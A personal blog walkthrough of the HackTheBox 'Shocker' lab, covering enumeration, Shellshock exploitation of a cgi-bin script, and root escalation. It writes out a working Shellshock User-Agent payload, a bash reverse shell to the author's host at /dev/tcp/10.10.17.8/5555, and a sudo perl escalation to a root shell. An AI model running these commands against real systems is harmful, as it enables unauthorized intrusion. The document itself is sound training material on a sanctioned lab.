---
title: Shocker - HackTheBox
date: 2026-01-21
tags:
  - hackthebox
  - linux
---
!![Image Description](/images/Pasted%20image%2020260120161129.png)
<!--more-->
## Introduction

In the [last post](/posts/ransom-part-2---hackthebox/), I struggled to complete Ransom - a Medium difficulty HackTheBox lab. While I made some good progress, I feel that it's slightly above my current skill level. This time I'm trying a mid-difficulty lab within the Easy difficulty tier. Let's see how it goes!
## Enumeration

Let's start with our boilerplate port scan, saved to a custom bash script called `port_enum` this time (nmap with the -sV and -sC flags set):

```
david@red:~$ port_enum $IP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-20 16:17 GMT
Nmap scan report for 10.129.79.69
Host is up (0.022s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.46 seconds
```

Pretty standard - a web server, plus an SSH service on a nonstandard port.

Running a standard Gobuster scan, we see the `cgi-bin` directory return a 403:

```
david@red:~$ dir_enum $IP
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.79.69
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/david/Pentest/wordlists/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 296]
/.htpasswd            (Status: 403) [Size: 296]
/cgi-bin/             (Status: 403) [Size: 295]
/server-status        (Status: 403) [Size: 300]
```

The guide is hinting that I need to find a file in cgi-bin. I'll crack it open in Burp Suite and fiddle with some HTTP Headers/Params. Failing that, we can brute force for common file names. Let's give it a shot!

!![Image Description](/images/Pasted%20image%2020260120162612.png)

I don't see much in this request! Next, I'm going to look up "fuzzing cgi-bin" and "common files in cgi-bin" as a different avenue

Ok, so nothing jumps out. I'm going to try out `ffuf -u http://$IP/cgi-bin/FUZZ.sh -w big.txt` to see if I can brute force a script...

!![Image Description](/images/Pasted%20image%2020260120163216.png)

No way... is there a user.sh script?

!![Image Description](/images/Pasted%20image%2020260120163323.png)

Oh yes there is! This appears to be the output from using the `uptime` command in Unix.

## Initial Foothold

Next, we're going to look for any CVEs related to CGI-bin. 

Aaaahhh... it's Shellshock, CVE-2014-6271. Researching the vulnerability, it appears that CGI is Common Gateway Interface, and it maps parts of an HTTP request to environment variables in a Bash script. If you can put a payload in a part of the request that gets mapped to a variable, you can manipulate the Bash invocation to get RCE.

It's worth noting that this only works if there's an existing shell script in the cgi-bin - that script is what is run with the environment variables (in this case, the User-Agent header)

I attempted to run this in Metasploit, but it took ages. So, I used this payload as a POC:

`User-Agent: () { :; }; echo; echo; /bin/bash -c 'id'`

And got this back:

`uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)`

Nice! Now I'll use a bash reverse shell + netcat to gain a foothold...

`bash -i >& /dev/tcp/10.10.17.8/5555 0>&1`

```
david@red:~/Pentest/shells$ nc -lnvp 5555
Listening on 0.0.0.0 5555
Connection received on 10.129.80.15 54604
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ 
```

Now, the guide asks us to find the binary that shelly can run as root on Shocker. I believe we can find what we need from this post: https://juggernaut-sec.com/manual-enumeration-lpe/

## Upgrade Shell

First, we'll upgrade to a full TTY with the guide below:

*The Python interpreter comes with a standard module named PTY that allows for creation of pseudo-terminals. By using this module, we can spawn a separate process from our remote shell and obtain a fully interactive shell.*

```
python3 -c 'import pty;pty.spawn("/bin/bash");'
```

*Immediately after running the initial Python command, we will see an improved bash shell.*

*Next, press **CTRL + Z** to background the session, and then run the following command:*

```
stty raw -echo
```

*Once that is done, type the following two commands to bring the session back to the foreground and then export the terminal emulator (xterm) for full TTY.*

```
fg
export TERM=xterm
```

## Privesc

Sweet. Now, we'll use `sudo -l` to see if there are any binaries we can run as root:

```
shelly@Shocker:/home/shelly$ sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
shelly@Shocker:/home/shelly$ 
```

Without any Googling... can I just run an os-like command with Perl to spawn a shell as root? Off to [GTFOBins...](https://gtfobins.org/gtfobins/perl/)

It's literally `-e exec`. So easy. So...

```
shelly@Shocker:/home/shelly$ sudo perl -e 'exec "/bin/sh"'
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt	
5bab1f3af5af594e00664a274d85953f
```

LET'S GO!!! AND THAT'S THE LAB!!!
## Reflection

- That went REALLY well, and I found that very easy. I need to be doing one of the harder rated Medium labs next.
- The roughest part was finding the user.sh script, but I quickly identified it after Googling `cgi-bin` enumeration.
- Sometimes, it's quicker to test an exploit manually than using a script, as evidenced by my Shellshock testing!